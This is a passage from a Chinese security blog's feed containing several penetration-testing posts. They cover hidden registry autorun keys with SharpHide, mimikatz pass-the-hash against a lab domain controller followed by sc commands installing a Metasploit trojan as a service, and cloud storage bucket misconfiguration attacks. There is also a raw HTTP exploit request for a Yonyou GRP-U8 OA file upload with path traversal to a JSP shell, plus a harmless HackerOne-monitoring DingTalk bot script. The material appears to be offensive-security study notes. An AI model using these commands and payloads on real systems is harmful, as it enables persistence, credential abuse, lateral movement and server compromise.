<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">完整步骤如下：</span><br><span class="line"></span><br><span class="line">1. 首先在你想要创建键值的注册表项下，创建一个新的字符串键值；</span><br><span class="line"></span><br><span class="line">2. 使用本机API函数RegSetValueExA()来创建以”\\0”开头的新键值，它的完整代码如下：</span><br><span class="line"></span><br><span class="line">// 函数声明</span><br><span class="line">LONG RegSetValueExA(</span><br><span class="line">HKEY hKey,</span><br><span class="line">LPCSTR lpValueName,</span><br><span class="line">DWORD Reserved,</span><br><span class="line">DWORD dwType,</span><br><span class="line">CONST BYTE *lpData,</span><br><span class="line">DWORD cbData</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// 调用例子</span><br><span class="line">LONG res = RegSetValueExA(hKey, &quot;\\0MyStringKey&quot;, 0, REG_SZ, (const BYTE*)&quot;MyStringValue&quot;, strlen(&quot;MyStringValue&quot;));</span><br></pre></td></tr></table></figure>

<p>(感觉不对呢，仅供参考吧)</p>
<p>随后我还是找了一个工具，工具的实现原理和上面的一样。但是这个工具需要我们下载下来之后自行编译，链接如下</p>
<p><a href="https://github.com/outflanknl/SharpHide">outflanknl/SharpHide: Tool to create hidden registry keys. (github.com)</a></p>
<p>那么简单介绍一下工具的使用方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">若要创建隐藏的注册表（运行）项，请执行以下操作：</span><br><span class="line">SharpHide.exe action=create keyvalue=&quot;C:\Windows\Temp\Bla.exe&quot; </span><br><span class="line"></span><br><span class="line">若要创建带有参数的隐藏注册表（运行）项，请执行以下操作：</span><br><span class="line">SharpHide.exe action=create keyvalue=&quot;C:\Windows\Temp\Bla.exe&quot; arguments=&quot;arg1 arg2&quot;</span><br><span class="line"></span><br><span class="line">删除隐藏的注册表（运行）项：</span><br><span class="line">SharpHide.exe action=delete</span><br></pre></td></tr></table></figure>

<p>开始实践，用命令添加了一个没参数的，</p>
<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106231937737.png" alt="image-20230106231937737"></p>
<p>现在来看注册表的里面是没有键值的</p>
<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106232344606.png" alt="image-20230106232344606"></p>
<p>现在重新启动一下，看看是不是成功写入启动项了</p>
<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106232447518.png" alt="image-20230106232447518"></p>
<p>成功了！</p>
<p>最后值得一提的是，该工具也适用于Cobalt Strike的execute-assembly。</p>
<p><a href="https://www.freeaihub.com/post/59039.html">execute-assembly实现原理(非托管C++代码调用C#) 狐狸教程 (freeaihub.com)</a></p>
<p>后续来进行进一步的研究</p>
]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>浅淡hash传递</title>
    <url>/2023/03/16/%E6%B5%85%E6%B7%A1hash%E4%BC%A0%E9%80%92/</url>
    <content><![CDATA[<h1 id="浅淡hash传递"><a href="#浅淡hash传递" class="headerlink" title="浅淡hash传递"></a>浅淡hash传递</h1><p>本文只是粗略介绍一些hash传递，后续会发获取hash和hash传递方法的总结。</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Pass The Hash 即PTH，也是内网渗透中较为常见的一个术语，就是通过传递Windwos 本地账户或者域用户的hash值，达到控制其他服务器的目的</p>
<p>在进入企业内网之后，如果是Windows PC或者服务器较多的环境,极有可能会使用到hash传递来进行内网的横传，现在企业内部一般对于口令强度均有一定的要求，抓取到本地hash后可能无法进行破解，同时从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash.在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，这时可以通过传递hash来进行横传。</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>hash 传递的原理是在认证过程中，并不是直接使用用户的密码进行认证的，而是使用用户的hash值，因此，攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不需要提供明文密码。在Windows系统中，通常会使用NTLM身份认证，NTLM是口令加密后的hash值。PTH是基于smb服务（139端口和445 端口）</p>
<h1 id="简单实操"><a href="#简单实操" class="headerlink" title="简单实操"></a>简单实操</h1><p>首先用红日靶场1现成的环境搭建一个域环境，一共三台机器，一个web服务器，一个dc，一个域成员。</p>
<p>现在模拟拿下了web服务器了，上传猕猴桃。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先用minikatz获取用户名和hash//需要管理员权限</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>虽然机器上抓到了明文密码，但是我们模拟没有抓到明文密码的情况</p>
<p><img src="/2023/03/16/%E6%B5%85%E6%B7%A1hash%E4%BC%A0%E9%80%92/image-20230316161943981.png" alt="image-20230316161943981"></p>
<p>现在拿域管理员的ntlm了</p>
<p>然后，在 Windows 7 上用 mimikatz 将获取的 Administrator 的 Hash 添加进 lsass 进程中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:GOD /ntlm:8a963371a63944419ec1adf687bb1be5</span><br></pre></td></tr></table></figure>

<p>成功，此时会自动弹出一个新的cmd窗口，这时访问远程主机或服务，就不用提供明文密码了，如下，我们列出了域控制器 DC 的c盘目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir  \\192.168.52.138\c$</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/16/%E6%B5%85%E6%B7%A1hash%E4%BC%A0%E9%80%92/image-20230316163307037.png" alt="image-20230316163307037"></p>
<p><img src="/2023/03/16/%E6%B5%85%E6%B7%A1hash%E4%BC%A0%E9%80%92/image-20230316163524101.png" alt="image-20230316163524101"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;sekurlsa::pth /domain:GOD /user:Administrator /ntlm:8a963371a63944419ec1adf687bb1be5 /run:cmd.exe&quot; </span><br></pre></td></tr></table></figure>

<p>此时，为了让域控制器 DC 上线 Metasploit，我们只需做以下工作。</p>
<p>生成一个msf木马shell.exe，将shell.exe上传到Windows 7主机，然后直接使用 copy 命令将shell.exe复制到域控上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy shell.exe \\DC.whoamianony.org\c$    // 将 shell.exe 复制到域控主机上</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc \\DC.whoamianony.org create backdoor binpath= &quot;c:\shell.exe&quot;// 在域控上创建服务启动木马</span><br><span class="line">sc \\DC.whoamianony.org start backdoor     // 在域控上立即启动该服务</span><br><span class="line">sc \\DC.whoamianony.org delete backdoor     // 在域控上立即删除该服务</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>火线沙龙云存储浅析 观看笔记</title>
    <url>/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="火线沙龙云存储浅析-观看笔记"><a href="#火线沙龙云存储浅析-观看笔记" class="headerlink" title="火线沙龙云存储浅析 观看笔记"></a>火线沙龙云存储浅析 观看笔记</h1><h1 id="1-何为对象存储"><a href="#1-何为对象存储" class="headerlink" title="1.何为对象存储"></a>1.何为对象存储</h1><p>对线存储(object-based storage)。也可以叫做面向对象的存储，现在也有不少厂商直接把他叫做云存储<img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319194028830.png" alt="image-20220319194028830"></p>
<h1 id="2-对象存储的利用方式"><a href="#2-对象存储的利用方式" class="headerlink" title="2.对象存储的利用方式"></a>2.对象存储的利用方式</h1><h2 id="2-1bucket公开访问"><a href="#2-1bucket公开访问" class="headerlink" title="2.1bucket公开访问"></a>2.1bucket公开访问</h2><p>在此时如果选择公有读的话，会出现两种情况</p>
<p>1.在只配置读写权限设置为公有读或公共读写的情况下，无法列出对象，但是可以直接访问对应的key路径。</p>
<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212000584.png" alt="image-20220319212000584"></p>
<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212010434.png" alt="image-20220319212010434"></p>
<p>也就是俗话说的，访问其下面的路径，类似未授权访问。</p>
<p>2.如果想列出object对象，只需要在bucket授权策略中设置listobject即可。<img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212131809.png" alt="image-20220319212131809"></p>
<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212142347.png" alt="image-20220319212142347"></p>
<h2 id="2-2bucket桶爆破"><a href="#2-2bucket桶爆破" class="headerlink" title="2.2bucket桶爆破"></a>2.2bucket桶爆破</h2><p>当知道bucket名称的时候，可以通过爆破获得bucket名称，这有些类似于目录爆破，只不过目录爆破一般通过状态码判断，而这个通过页面的内容判断</p>
<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212403531.png" alt="image-20220319212403531"></p>
<p>下面是名称对了，第一个是设置了objectlist，后面是没有权限访问</p>
<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212457984.png" alt="image-20220319212457984"></p>
<h2 id="2-3特定的bucket策略配置"><a href="#2-3特定的bucket策略配置" class="headerlink" title="2.3特定的bucket策略配置"></a>2.3特定的bucket策略配置</h2><p>特定的策略配置是指，如果管理员设置了某些ip，ua才可以请求改存储桶的话，此时如果错误的配置了getbucketpolicy，可导致攻击者获取策略配置。</p>
<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212724053.png" alt="image-20220319212724053"></p>
<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212753558.png" alt="image-20220319212753558"></p>
<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212821561.png" alt="image-20220319212821561"></p>
<h2 id="2-4bucket-object遍历"><a href="#2-4bucket-object遍历" class="headerlink" title="2.4bucket object遍历"></a>2.4bucket object遍历</h2><p>类似于目录遍历</p>
<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212903537.png" alt="image-20220319212903537"></p>
<h2 id="2-5任意文件上传与覆盖"><a href="#2-5任意文件上传与覆盖" class="headerlink" title="2.5任意文件上传与覆盖"></a>2.5任意文件上传与覆盖</h2><p>如果在配置存储桶，管理员错误的将存储桶权限，配置为可写，这将会导致攻击者可上传任意文件去覆盖。</p>
<h2 id="2-6accesskeyld，secretaccessket泄露"><a href="#2-6accesskeyld，secretaccessket泄露" class="headerlink" title="2.6accesskeyld，secretaccessket泄露"></a>2.6accesskeyld，secretaccessket泄露</h2><p>1.通过github等开源平台中的源代码中可发现存在泄露的key。</p>
<p>2.通过反编译apk，小程序找到敏感信息。</p>
<p>3.在目标网站源代码中找到一些敏感的信息，js等。<img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319213139689.png" alt="image-20220319213139689">有个工具推荐，是burp的插件，就是我们把正则表达式配置好，他会自动检测流量，然后看是否复合正则表达式。 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/gh0stkey/HaE</span><br></pre></td></tr></table></figure>

<h2 id="2-7bucket与子域接管"><a href="#2-7bucket与子域接管" class="headerlink" title="2.7bucket与子域接管"></a>2.7bucket与子域接管</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319213519789.png" alt="image-20220319213519789"></p>
<p>大概意思就是，管理员删除了存储桶但是没有删除地址解析，然后我们自己创建一个bucket，和那个受害删除桶的名称一样，上传一个文件可以看到上传上去了，这就是成功接管了这个桶了</p>
<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319213547151.png" alt="image-20220319213547151"></p>
<h2 id="2-8bucket策略配置可写"><a href="#2-8bucket策略配置可写" class="headerlink" title="2.8bucket策略配置可写"></a>2.8bucket策略配置可写</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319215031791.png" alt="image-20220319215031791"></p>
<h2 id="2-9修改bucket策略为deny使业务瘫痪"><a href="#2-9修改bucket策略为deny使业务瘫痪" class="headerlink" title="2.9修改bucket策略为deny使业务瘫痪"></a>2.9修改bucket策略为deny使业务瘫痪</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319215152619.png" alt="image-20220319215152619"></p>
<h2 id="2-10修改网站引用s3资源进行钓鱼"><a href="#2-10修改网站引用s3资源进行钓鱼" class="headerlink" title="2.10修改网站引用s3资源进行钓鱼"></a>2.10修改网站引用s3资源进行钓鱼</h2><p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319215311222.png" alt="image-20220319215311222"></p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>用友GRP-U8 OA文件上传</title>
    <url>/2022/09/06/%E7%94%A8%E5%8F%8BGRP-U8-OA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h1 id="用友GRP-U8-OA上传"><a href="#用友GRP-U8-OA上传" class="headerlink" title="用友GRP-U8 OA上传"></a>用友GRP-U8 OA上传</h1><p>app.name=”用友GRP-U8 OA” </p>
<h2 id="页面"><a href="#页面" class="headerlink" title="页面"></a>页面</h2><p><img src="/2022/09/06/%E7%94%A8%E5%8F%8BGRP-U8-OA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png" alt="image.png"></p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /UploadFileData?action=upload_file&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;foldername=%2e%2e%2f&amp;filename=test.jsp&amp;filename=1.jpg HTTP/1.1</span><br><span class="line">Host: XXX.XXX.XXX:99</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------192386535332116664783811905534</span><br><span class="line">Content-Length: 263</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------192386535332116664783811905534</span><br><span class="line">Content-Disposition: form-data; name=&quot;myFile&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: application/x-php</span><br><span class="line"></span><br><span class="line">&lt;%out.print(&quot;test vulnerability!&quot;);%&gt;</span><br><span class="line">-----------------------------192386535332116664783811905534--</span><br></pre></td></tr></table></figure>

<p><strong>上传</strong><br><img src="/2022/09/06/%E7%94%A8%E5%8F%8BGRP-U8-OA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png" alt="image.png"></p>
<p><strong>getshell</strong><br><img src="/2022/09/06/%E7%94%A8%E5%8F%8BGRP-U8-OA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>监控hackone报告机器人</title>
    <url>/2023/04/27/%E7%9B%91%E6%8E%A7hackone%E6%8A%A5%E5%91%8A%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
    <content><![CDATA[<h1 id="监控hackone报告机器人"><a href="#监控hackone报告机器人" class="headerlink" title="监控hackone报告机器人"></a>监控hackone报告机器人</h1><p>找了个机器人，分享一下脚本。使用方法就是</p>
<ol>
<li><p>创建钉钉机器人，选择自定义 WEBHOOK 类型，可通过自定义关键词或 IP 地址进行安全设置。创建完成后，复制机器人的 accesstoken。</p>
</li>
<li><p>将源代码中的 accesstoken 替换为您自己的，使用 Python3.8.X 在后台运行。您可以直接输入 <code>python3 h1_notifier.py</code> &amp; 或在 tmux 中运行。</p>
<p>后续可能会过期无法使用，但是无所谓，我到时候再改就行。</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> feedparser</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(filename=<span class="string">&#x27;script_output.log&#x27;</span>,</span><br><span class="line">                    level=logging.INFO,</span><br><span class="line">                    <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># CONFIG</span></span><br><span class="line">DINGTALK_WEBHOOK = <span class="string">&quot;https://oapi.dingtalk.com/robot/send?access_token=&quot;</span></span><br><span class="line">last_sent_tweet_pubdate = <span class="literal">None</span>  <span class="comment"># Add a global variable</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_link_description</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line"></span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        meta_title_element = soup.find(<span class="string">&#x27;meta&#x27;</span>, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;description&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> meta_title_element <span class="keyword">and</span> <span class="string">&#x27;content&#x27;</span> <span class="keyword">in</span> meta_title_element.attrs:</span><br><span class="line">            description = meta_title_element[<span class="string">&#x27;content&#x27;</span>].replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            description = <span class="string">&#x27;No Description Found&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> description</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.info(<span class="string">f&quot;Error getting description for <span class="subst">&#123;url&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_to_dingtalk</span>(<span class="params">content, title</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;msgtype&quot;</span>: <span class="string">&quot;markdown&quot;</span>,</span><br><span class="line">        <span class="string">&quot;markdown&quot;</span>: &#123;<span class="string">&quot;title&quot;</span>: title, <span class="string">&quot;text&quot;</span>: content&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(DINGTALK_WEBHOOK, headers=headers, json=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_new_published_tweets</span>(<span class="params">feed, last_sent_tweet_pubdate</span>):</span></span><br><span class="line">    new_published_tweets = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> entry <span class="keyword">in</span> feed.entries:</span><br><span class="line">        tweet_pubdate = datetime.strptime(entry.published.replace(<span class="string">&quot;GMT&quot;</span>, <span class="string">&quot;+0000&quot;</span>), <span class="string">&#x27;%a, %d %b %Y %H:%M:%S %z&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> last_sent_tweet_pubdate <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> tweet_pubdate &gt; last_sent_tweet_pubdate:</span><br><span class="line">            new_published_tweets.append(entry)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new_published_tweets</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_tweet</span>(<span class="params">url_list</span>):</span></span><br><span class="line">    <span class="keyword">global</span> last_sent_tweet_pubdate</span><br><span class="line">    <span class="comment"># random rss_url</span></span><br><span class="line">    random.shuffle(url_list)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">        feed = feedparser.parse(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(feed.entries) &gt; <span class="number">0</span>:</span><br><span class="line">            new_published_tweets = get_new_published_tweets(feed, last_sent_tweet_pubdate)</span><br><span class="line">            <span class="keyword">if</span> new_published_tweets:</span><br><span class="line">                <span class="keyword">for</span> entry <span class="keyword">in</span> new_published_tweets:</span><br><span class="line">                    tweet_text = entry.title</span><br><span class="line">                    url_link = re.search(<span class="string">r&#x27;https://hackerone\.com/reports/\d+&#x27;</span>, tweet_text)</span><br><span class="line">                    <span class="keyword">if</span> url_link:</span><br><span class="line">                        <span class="comment"># Convert the link in the tweet to MarkDown format to support mobile access.</span></span><br><span class="line">                        tweet_text = tweet_text.replace(url_link.group(), <span class="string">f&quot;[<span class="subst">&#123;url_link.group()&#125;</span>](<span class="subst">&#123;url_link.group()&#125;</span>)&quot;</span>)</span><br><span class="line">                        logging.info(<span class="string">f&quot;RSS URL used: <span class="subst">&#123;url&#125;</span>, Latest tweet: <span class="subst">&#123;tweet_text[:<span class="number">30</span>]&#125;</span>, Time: <span class="subst">&#123;last_sent_tweet_pubdate&#125;</span>&quot;</span>)</span><br><span class="line">                        tweet_pubdate = datetime.strptime(entry.published.replace(<span class="string">&quot;GMT&quot;</span>, <span class="string">&quot;+0000&quot;</span>), <span class="string">&#x27;%a, %d %b %Y %H:%M:%S %z&#x27;</span>)</span><br><span class="line">                        hackerone_url_match = re.search(<span class="string">r&#x27;https://hackerone\.com/reports/\d+&#x27;</span>, tweet_text)</span><br><span class="line">                        hackerone_url = hackerone_url_match.group()</span><br><span class="line">                        link_description = get_link_description(hackerone_url)</span><br><span class="line">                        <span class="keyword">if</span> link_description:</span><br><span class="line">                            content = <span class="string">f&quot;**Tweet:** \n\n<span class="subst">&#123;tweet_text&#125;</span>\n\n**Description:**\n\n <span class="subst">&#123;link_description&#125;</span>\n\n&quot;</span></span><br><span class="line">                            send_to_dingtalk(content, link_description)</span><br><span class="line">                        last_sent_tweet_pubdate = <span class="built_in">max</span>(last_sent_tweet_pubdate, tweet_pubdate) <span class="keyword">if</span> last_sent_tweet_pubdate <span class="keyword">else</span> tweet_pubdate</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        logging.info(<span class="string">f&quot;Tweet does not contain hackerone.com, skipping, Time: <span class="subst">&#123;last_sent_tweet_pubdate&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logging.info(<span class="string">f&quot;Tweet has already been sent, skipping, Time: <span class="subst">&#123;last_sent_tweet_pubdate&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.info(<span class="string">&quot;Unable to get valid RSS data from all provided URLs.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> last_sent_tweet_pubdate</span><br><span class="line">    TWITTER_USER = <span class="string">&#x27;disclosedh1&#x27;</span></span><br><span class="line"></span><br><span class="line">    TWITTER_RSS_URLS = [</span><br><span class="line">        <span class="string">f&quot;https://nitter.net/<span class="subst">&#123;TWITTER_USER&#125;</span>/rss&quot;</span>,</span><br><span class="line">        <span class="comment">#f&quot;https://nitter.unixfox.eu/&#123;TWITTER_USER&#125;/rss&quot;,</span></span><br><span class="line">        <span class="string">f&quot;https://nitter.snopyta.org/<span class="subst">&#123;TWITTER_USER&#125;</span>/rss&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;https://twitter.owacon.moe/<span class="subst">&#123;TWITTER_USER&#125;</span>/rss&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    logging.info(<span class="string">&quot;Checking for new tweets...&quot;</span>)</span><br><span class="line">    process_tweet(TWITTER_RSS_URLS)</span><br><span class="line">    </span><br><span class="line">    schedule.every(<span class="number">10</span>).minutes.do(process_tweet, TWITTER_RSS_URLS)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        schedule.run_pending()</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-tools</category>
      </categories>
  </entry>
  <entry>
    <title>百度Ueditor编辑器漏洞总结</title>
    <url>/2022/06/02/%E7%99%BE%E5%BA%A6Ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
